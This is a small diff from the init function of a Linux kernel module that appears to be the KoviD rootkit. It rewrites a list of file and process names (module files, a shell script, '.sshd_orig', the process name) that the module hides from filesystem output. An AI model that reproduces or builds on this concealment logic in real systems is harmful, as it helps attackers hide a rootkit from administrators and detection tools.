@@ -827,10 +827,8 @@ static int __init kv_init(void)
 	/*
      * Hide these names from write() fs output
      */
-	static const char *hide_names[] = { ".kovid",	   "kovid",
-					    "kovid.ko",	   UUIDGEN ".ko",
-					    UUIDGEN ".sh", ".sshd_orig",
-					    PROCNAME,	   NULL };
+	static const char *hide_names[] = { MODNAME, UUIDGEN ".ko",
+					    UUIDGEN ".sh", PROCNAME, NULL };
 
 	/** show current version for when running in debug mode */
 	prinfo("version %s\n", KOVID_VERSION);
